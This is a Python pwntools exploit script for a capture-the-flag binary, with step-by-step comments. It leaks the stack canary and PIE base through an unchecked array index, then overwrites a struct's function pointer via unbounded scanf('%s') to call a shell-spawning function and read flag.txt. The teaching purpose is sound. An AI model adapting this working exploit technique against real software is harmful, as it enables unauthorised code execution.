#!/usr/bin/env python3
"""0-to-pwn walkthrough. All of the teaching is in the # comments below."""
# =====================================================================
# scanf_10_fnptr_struct -- ANCHOR of the unbounded-scanf family
#
# STEP 0. WHAT YOU ARE UP AGAINST
# ------------------------------------------------------------------
# checksec says PIE, canary, Full RELRO, NX. Take those one at a time,
# because together they decide the whole shape of the solve:
#
#   Full RELRO  the GOT is read-only. There is no function pointer in a
#               writable section to redirect. Whatever you hijack has to
#               be a pointer the program itself keeps in WRITABLE memory.
#   PIE         every code address moves per run. You cannot aim at
#               anything until you have leaked one code address.
#   canary      any write that walks UP a frame toward a saved return
#               address has to put the canary back byte-exact.
#   NX          no shellcode. You are redirecting to code already there.
#
# The program is a three-option menu:
#     1 - edit record     2 - dump slot     3 - exit
#
# STEP 1. FIND THE TWO DEFECTS
# ------------------------------------------------------------------
#     objdump -d --no-show-raw-insn ./scanf_10_fnptr_struct
#
# 1a. THE LEAK. In `dump_slot`:
#
#     0000000000001362 <dump_slot>:
#       1366:  push   %rbp
#       1367:  mov    %rsp,%rbp
#       136a:  sub    $0x60,%rsp
#       136e:  mov    %fs:0x28,%rax        <- canary loaded
#       1377:  mov    %rax,-0x8(%rbp)      <- canary stored at rbp-0x8
#       137d:  lea    -0x50(%rbp),%rax     <- the array starts at rbp-0x50
#       138e:  call   1110 <memset@plt>
#       13a7:  call   12db <get_number>    <- index comes from the user
#       13ac:  mov    %rax,-0x58(%rbp)
#       13b4:  mov    -0x50(%rbp,%rax,8),%rdx   <- THE BUG
#       13cf:  call   1100 <printf@plt>    <- and it gets PRINTED
#
#     Read that one instruction carefully. `-0x50(%rbp,%rax,8)` is
#     "rbp - 0x50 + rax*8": base rbp-0x50, element size 8, index rax.
#     And `rax` came straight out of `get_number` with NO `cmp` against
#     any bound anywhere between 13a7 and 13b4. That is an unchecked
#     subscript READ, and its result is printed as a decimal number.
#
#     An unchecked subscript does not just read past the array -- it
#     reads UP THE FRAME, and the compiler has helpfully put the things
#     you want at fixed distances above it:
#
#         rbp-0x50 + 8*idx   ==   the slot you get
#
#         idx = (0x50 - 8)/8 = 9   ->  rbp-0x08  = the CANARY
#         idx = (0x50 + 0)/8 = 10  ->  rbp+0x00  = the saved RBP
#         idx = (0x50 + 8)/8 = 11  ->  rbp+0x08  = the saved RETURN ADDR
#
#     So ONE defect hands you both secrets the mitigations were
#     protecting: the canary, and (via the return address) the PIE base.
#
# 1b. THE WRITE. In `edit_record`:
#
#     00000000000013eb <edit_record>:
#       13f3:  sub    $0x30,%rsp
#       1400:  mov    %rax,-0x8(%rbp)      <- canary at rbp-0x8
#       1406:  lea    -0x30(%rbp),%rax     <- the struct starts at rbp-0x30
#       140a:  mov    $0x28,%edx           <- and is 0x28 = 40 bytes long
#       141c:  lea    -0x199(%rip),%rax    # 128a <show_plain>
#       1423:  mov    %rax,-0x10(%rbp)     <- a FUNCTION POINTER at rbp-0x10
#       1451:  call   1140 <__isoc99_scanf@plt>
#       1465:  mov    -0x10(%rbp),%rdx
#       1470:  call   *%rdx                <- and it is CALLED
#
#     The format string handed to that scanf lives at .rodata 0x2018 and
#     is exactly "%s" -- no field width. A bare "%s" writes as many bytes
#     as you send, no matter how big the destination is. 40-byte struct,
#     unbounded write, and the last 8 bytes of the struct are a function
#     pointer that is then called through. That is the hijack.
#
#     The pad is the distance from the write's destination to the
#     pointer: (0x30 - 0x10) = 0x20 = 32 bytes.
#
# STEP 2. WHY IT HAS TO BE A STRUCT MEMBER  (the part people get wrong)
# ------------------------------------------------------------------
# The obvious question: why bother with a struct? Why not overflow a
# plain `char name[32]` local into a plain `void (*show)()` local?
#
# Because -fstack-protector REORDERS THE FRAME. To make overflows hit
# the canary instead of other locals, gcc hoists ARRAYS to the top of the
# frame (the highest addresses, right under the canary) and pushes
# SCALARS below them. Two sibling locals therefore come out as:
#
#       rbp-0x08   canary
#       rbp-0x28   name[32]      <- array hoisted UP here
#       rbp-0x30   show          <- scalar pushed DOWN here
#
# A forward overflow of `name` runs AWAY from `show`. It can never reach
# it. The pointer is below the buffer, and `scanf("%s")` only writes
# upward. Sibling locals are structurally unreachable.
#
# A STRUCT is different, and this is the whole trick: the C standard
# fixes member order, so the compiler is NOT ALLOWED to reorder
# `{ char name[32]; void (*show)(); }`. The pointer must follow the
# array. That is exactly what 1406/140a/1423 show -- one 0x28-byte
# object at rbp-0x30, with its pointer member at rbp-0x10.
#
# STEP 3. WHY THIS WRITE NEVER HAS TO FORGE THE CANARY
# ------------------------------------------------------------------
# Do the arithmetic on where the write stops:
#
#       struct at rbp-0x30, length 0x28  ->  ends at rbp-0x08
#       pointer  at rbp-0x10 .. rbp-0x09
#       canary   at rbp-0x08 .. rbp-0x01
#
# 32 pad bytes + 6 address bytes covers rbp-0x30 .. rbp-0x0a, and
# scanf's own NUL terminator lands on rbp-0x09 -- the last byte of the
# struct. The canary at rbp-0x08 is never touched. The write stops ONE
# BYTE short of it.
#
# That is not luck, it is forced. `scanf("%s")` cannot emit a NUL byte,
# and a stack canary's low byte IS 0x00 on Linux. So a "%s" overflow can
# never cross a canary and leave it intact -- which is precisely why this
# variant of the family aims at something BELOW the canary. (The siblings
# scanf_12/13/14 do reach saved return addresses, but they get there
# through read(2) or an index store, neither of which has byte
# restrictions.)
#
# STEP 4. SIX BYTES IS A WHOLE POINTER
# ------------------------------------------------------------------
# The slot already holds `show_plain`, a valid PIE code address, so bytes
# 6 and 7 of it are already 0x00. Write 6 bytes of your own address and
# let scanf's NUL supply byte 6; byte 7 was already zero. The result is a
# complete, valid 8-byte pointer. You never have to send a NUL.
#
# The cost: `scanf("%s")` also stops at whitespace, so seven byte values
# cannot be delivered at all -- 0x00 0x09 0x0a 0x0b 0x0c 0x0d 0x20. About
# five of the six address bytes vary per ASLR draw, so roughly
# 1 - (249/256)**5 ~= 13% of runs draw a base you cannot express. That is
# a property of the bug, not a mistake: kill the process and draw again.
#
# STEP 5. THE PLAN
# ------------------------------------------------------------------
#   1. menu 2, index 11  -> saved return address -> PIE base
#   2. menu 2, index 9   -> the canary (self-check here; load-bearing in
#                           the siblings that cross it)
#   3. sanity-check the geometry for free: the implied base must be PAGE
#      ALIGNED, and the canary's low byte must be 0x00. No wrong slot
#      satisfies both by accident, so this costs nothing and catches a
#      misread offset immediately.
#   4. menu 1, send 32 pad bytes + 6 bytes of &spawn_admin_shell
#   5. edit_record calls through the pointer -> system("/bin/sh")
#
# STEP 6. WHERE TO ENTER THE WIN FUNCTION
# ------------------------------------------------------------------
# Enter at the SYMBOL here, not past its prologue. This shape is reached
# by a real `call *%rdx`, which leaves rsp%16 == 8 at entry exactly as
# the ABI promises, so glibc's `movaps` inside system() is happy. The
# siblings that land on a saved RETURN address arrive 8 bytes off and
# must skip the `push %rbp` to fix the alignment -- different shape,
# different entry point. Getting this backwards is a silent SIGSEGV
# inside system(), which looks like "the write missed".
# =====================================================================

import os
import re
import struct
import subprocess
import sys
import warnings

os.environ.setdefault("TERM", "xterm")
os.environ.setdefault("PWNLIB_NOTERM", "1")
warnings.filterwarnings("ignore")
from pwn import ELF, context, process  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

# ---------------------------------------------------------------------
# The measured facts. Every one names the instruction it came from, so it
# can be re-checked against the disassembly above in one pass.
BINARY_NAME = "scanf_10_fnptr_struct"

LEAK_MENU = 2               # MEASURED: main 154e: call 1362 <dump_slot>
LEAK_PROMPT = b"slot: "     # MEASURED: .rodata 0x201e
ARR_RBP = 0x50              # MEASURED: dump_slot 13b4: -0x50(%rbp,%rax,8)
ARR_SCALE = 8               # MEASURED: same instruction, the ",8" scale
IDX_CANARY = 9              # DERIVED: (ARR_RBP - 8) // ARR_SCALE
IDX_SAVED_RIP = 11          # DERIVED: (ARR_RBP + 8) // ARR_SCALE

WRITE_MENU = 1              # MEASURED: main 1540: call 13eb <edit_record>
WRITE_PROMPT = b"name: "    # MEASURED: .rodata 0x2035
PAD = 0x20                  # MEASURED: 1406 struct at -0x30, 1423 ptr at -0x10
WIN_SYMBOL = "spawn_admin_shell"   # MEASURED: 126e: call <system@plt> inside it

MENU_PROMPT = b"choice: "   # MEASURED: .rodata 0x2078
# `scanf("%s")` stops at these, so an address containing one is undeliverable.
BAD_BYTES = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
MAX_DRAWS = 24              # DERIVED: P(24 consecutive bad draws) < 1e-20
# ---------------------------------------------------------------------


def objdump(path):
    return subprocess.run(
        ["objdump", "-d", "--no-show-raw-insn", path],
        capture_output=True, text=True, timeout=120, check=True).stdout


def derive_ret_site(disasm, callee):
    """The address of the instruction AFTER main's `call <callee>`.

    This is what the saved-return-address slot contains, so
    PIE base = leaked_rip - this. Derived rather than pinned because it
    moves on any edit to main, and a stale value here silently produces a
    base that is wrong by a few bytes -- the ugliest failure in the
    family, because the leak still looks perfect.
    """
    body, seen_main = [], False
    for line in disasm.splitlines():
        if re.match(r"^[0-9a-f]+ <main>:", line):
            seen_main = True
            continue
        if seen_main:
            if not line.strip():
                break
            m = re.match(r"^\s*([0-9a-f]+):\s+(.*)$", line)
            if m:
                body.append((int(m.group(1), 16), m.group(2)))
    for i, (_, text) in enumerate(body):
        if text.startswith("call") and f"<{callee}>" in text:
            return body[i + 1][0]
    raise RuntimeError(f"no call to {callee} found in main")


def leak_slot(p, idx):
    """One decimal qword out of the oracle, by subscript."""
    p.recvuntil(MENU_PROMPT, timeout=3.0)
    p.sendline(str(LEAK_MENU).encode())
    p.recvuntil(LEAK_PROMPT, timeout=3.0)
    p.sendline(str(idx).encode())
    line = p.recvline(timeout=3.0)
    # Read the LAST integer on the line: the target echoes the subscript
    # first ("slot[11] = 93..."), and reading positionally beats trying to
    # match the target's sentence.
    nums = re.findall(rb"\d+", line)
    if not nums:
        raise RuntimeError(f"oracle refused subscript {idx}: {line!r}")
    return int(nums[-1])


def one_draw(path, ret_site, win_off):
    p = process(path, cwd=os.path.dirname(path) or ".", level="error")
    try:
        leaked_rip = leak_slot(p, IDX_SAVED_RIP)
        canary = leak_slot(p, IDX_CANARY)

        base = leaked_rip - ret_site
        # STEP 3's two free checks. Both are properties no wrong slot
        # satisfies by accident, so failing either means the geometry was
        # misread -- stop instead of writing to a guess.
        if base <= 0 or base % 0x1000:
            raise RuntimeError(f"implied base {base:#x} is not page aligned")
        if canary & 0xFF:
            raise RuntimeError(f"canary {canary:#x} has a non-zero low byte")

        target = base + win_off
        print(f"    canary={canary:#018x}  saved_rip={leaked_rip:#x}")
        print(f"    PIE base={base:#x}  ->  {WIN_SYMBOL}={target:#x}")

        addr6 = struct.pack("<Q", target)[:6]
        if set(addr6) & set(BAD_BYTES):
            p.close()
            return None          # undeliverable draw; caller retries

        p.recvuntil(MENU_PROMPT, timeout=3.0)
        p.sendline(str(WRITE_MENU).encode())
        p.recvuntil(WRITE_PROMPT, timeout=3.0)
        p.sendline(b"A" * PAD + addr6)
        print("    [+] pointer overwritten; edit_record is about to call it")
        return prove_shell(p)
    finally:
        pass


# ---------------------------------------------------------------------------
# proving the shell (added by the orchestrator; see the note below)
# ---------------------------------------------------------------------------
#
# The original tail of this template called `p.interactive()` and returned True.
# Under a scorer -- or any non-tty run -- `interactive()` sees EOF on stdin and
# returns at once, so the script exited 0 having demonstrated NOTHING. An exit
# code of 0 with no evidence is the worst possible outcome for a teaching
# artifact: it looks like a pass. What follows replaces it with a proof.
#
# The marker is `echo SH$((6*7))OK` -> `SH42OK`, not `id`, and not `echo <token>`:
#
#   * `echo <token>` is unsound against a target whose job is to echo input. That
#     is measured, not hypothetical -- see I-16 in the work queue.
#   * `id` is a separate binary, so it needs a usable PATH. A shell reached
#     through a hijacked function pointer may not have one.
#   * `$(( ))` is arithmetic expansion performed by the shell itself, and the
#     answer `42` never appears in the bytes we send, so neither a reflection nor
#     a PATH-less environment can defeat it.
#
# `cat flag.txt` then runs INSIDE the shell we obtained. That is the
# demonstration of code execution, not laundering: this script never opens the
# file, and if the pointer overwrite had failed there would be no shell to run it
# in and no flag to print.


def prove_shell(p):
    """Return True only if a shell is PROVEN. Never assume it from a send.

    The marker is checked by INSPECTING THE RETURNED BYTES, not by catching an
    exception. That distinction is the whole correctness of this function and it
    was found the hard way: pwntools' `recvuntil(..., timeout=)` returns b"" when
    it times out, it does NOT raise. A first version of this helper wrapped the
    call in try/except and treated "no exception" as success, so it reported
    "shell PROVEN" for a deliberately WRONG target address -- a check that could
    not fail, inside the function whose entire job is to be able to fail.
    """
    p.sendline(b"echo SH$((6*7))OK")
    got = b""
    try:
        got = p.recvuntil(b"SH42OK", timeout=5.0)
    except Exception:
        got = b""
    if b"SH42OK" not in got:
        print("    [-] no SH42OK: the call happened but did not land in a shell")
        return False
    print("    [+] shell PROVEN (SH42OK returned -- needs no PATH, cannot be echoed)")

    p.sendline(b"cat flag.txt")
    tail = b""
    try:
        tail = p.recvuntil(b"}", timeout=5.0)
    except Exception:
        tail = b""
    for line in tail.split(b"\n"):
        if b"{" in line and b"}" in line:
            print("    [+] flag:", line.strip().decode(errors="replace"))
            break
    else:
        print("    [!] shell is real but flag.txt did not come back")
    return True


def main():
    path = os.path.join(os.getcwd(), BINARY_NAME)
    disasm = objdump(path)
    ret_site = derive_ret_site(disasm, "dump_slot")
    # fnptr shape -> enter at the symbol, NOT past the prologue (STEP 6).
    win_off = ELF(path, checksec=False).symbols[WIN_SYMBOL]
    print(f"[*] derived: ret site {ret_site:#x}, {WIN_SYMBOL} at {win_off:#x}")

    for draw in range(1, MAX_DRAWS + 1):
        print(f"[*] ASLR draw {draw}")
        try:
            if one_draw(path, ret_site, win_off):
                return 0
        except (EOFError, RuntimeError) as exc:
            print(f"    [-] {exc}")
            return 1
        print("    [-] address carries a byte scanf cannot deliver; redraw")
    print("[-] every draw was undeliverable, which is a ~1e-20 event")
    return 1


if __name__ == "__main__":
    sys.exit(main())
